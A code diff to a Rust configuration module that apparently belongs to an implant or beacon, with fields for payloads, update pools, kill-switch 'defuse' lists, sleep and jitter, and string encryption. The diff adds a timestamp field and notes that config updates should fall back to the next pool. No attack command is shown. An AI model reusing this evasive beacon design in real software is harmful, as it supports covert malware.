@@ -16,6 +16,10 @@ use log::info;
 use cryptify::encrypt_string;
 
 use std::collections::BTreeMap;
+use chrono::prelude::*;
+//#use chrono::serde::ts_seconds_option;
+//    #[serde(with = "ts_seconds_option")]
+
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct SignMaterial {
@@ -27,11 +31,12 @@ pub struct SignMaterial {
 pub struct Config {
     pub update_links: BTreeMap<String, PoolLinks>,
     pub payloads: Vec<Payload>,
-    pub defuse_update: Vec<Defuse>,
+    pub defuse_update: Vec<Defuse>, 
     pub defuse_payload: Vec<Defuse>,
     pub sign_material: SignMaterial,
     pub sleep: u64,
     pub jitt: u64,
+    pub date: DateTime<Utc>,
 }
 #[allow(dead_code)]
 impl Config {
@@ -55,6 +60,7 @@ impl Config {
             defuse_payload: defuse_payload,
             sleep: sleep,
             jitt: jitt,
+            date:Utc::now()
         }
     }
     pub fn new_empty() -> Config {
@@ -70,6 +76,7 @@ impl Config {
             defuse_payload: vec![],
             sleep: 0,
             jitt: 0,
+            date: Utc::now()
         }
     }
 
@@ -251,7 +258,7 @@ impl Config {
         thread::sleep(sleep_time);
     }
 
-    // try to fetch a new config, if no config are found return self.
+    // try to fetch a new config, if no config are found return self. if no config is return from pool, need to try the next pool
     pub fn update_config(&self) -> Config {
         let mut pool_nb: i32 = 0;
         for (pool_name, pool_links) in &self.update_links {
